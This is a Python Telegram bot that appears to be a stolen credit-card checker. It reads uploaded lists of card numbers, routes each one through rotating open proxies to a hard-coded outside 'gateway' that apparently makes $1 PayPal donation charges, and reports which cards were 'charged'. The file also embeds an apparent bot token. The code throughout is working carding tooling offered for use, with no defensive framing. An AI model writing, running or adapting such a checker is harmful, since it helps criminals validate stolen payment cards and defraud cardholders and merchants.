from telebot import TeleBot, types
import requests
import time

bot = TeleBot("8663863938:AAG9rm2FS5OpYHnRAnUql0r7oMJFyGMLwLs")

GATEWAY = "http://138.128.240.15:8025/paypal_donate?cc="

proxies_list = [
    "http://148.230.4.241:999",
    "http://2.78.60.10:3129",
    "http://1.231.81.166:3128",
    "http://45.167.124.71:999",
    "http://103.157.200.126:3128",
    "http://80.92.204.47:1081"
]

current_proxy = 0
stop_flags = {}

def get_proxy():
    global current_proxy
    proxy = proxies_list[current_proxy % len(proxies_list)]
    current_proxy += 1
    return {"http": proxy, "https": proxy}

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ **Same as Screenshot Mode ON**\n/chk — txt file bhej")

@bot.message_handler(commands=['chk'])
def chk_file(m):
    bot.send_message(m.chat.id, "📁 Cards wali .txt file bhej")

@bot.message_handler(content_types=['document'])
def handle_file(m):
    if not m.document.file_name.endswith('.txt'):
        bot.reply_to(m, "Sirf .txt file bhej")
        return

    file_info = bot.get_file(m.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]

    if not cards:
        bot.reply_to(m, "File empty hai")
        return

    stop_flags[m.chat.id] = False
    live = 0
    dead = 0

    # Progress message
    progress_msg = bot.send_message(m.chat.id, "🔄 Starting check...")

    for i, card in enumerate(cards):
        if stop_flags.get(m.chat.id):
            bot.edit_message_text("🛑 Stopped by user", m.chat.id, progress_msg.message_id)
            break

        proxy = get_proxy()
        current_card = card[:12] + "****"

        # Update current card
        bot.edit_message_text(
            f"🔄 Checking {i+1}/{len(cards)}\n"
            f"**Current Card:** `{current_card}`\n"
            f"✅ Charged: {live}\n"
            f"❌ Declined: {dead}\n"
            f"📊 Total: {len(cards)}",
            m.chat.id, progress_msg.message_id
        )

        try:
            url = GATEWAY + card.replace(" ", "")
            r = requests.get(url, proxies=proxy, timeout=20)
            resp = r.text

            if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
                live += 1
                bot.send_message(m.chat.id, f"✅ **1$ Charged - Card Approved**\n{card}")
            else:
                dead += 1

        except:
            dead += 1

        time.sleep(1.2)  # speed control

    # Final result
    bot.edit_message_text(
        f"✅ **CHECKING COMPLETE**\n"
        f"✅ Charged: {live}\n"
        f"❌ Declined: {dead}\n"
        f"📊 Total: {len(cards)}",
        m.chat.id, progress_msg.message_id
    )

    # Stop button
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Stop", callback_data="stop"))
    bot.send_message(m.chat.id, "Process Complete", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "stop":
        stop_flags[call.message.chat.id] = True
        bot.answer_callback_query(call.id, "Stopping...")

bot.infinity_polling()
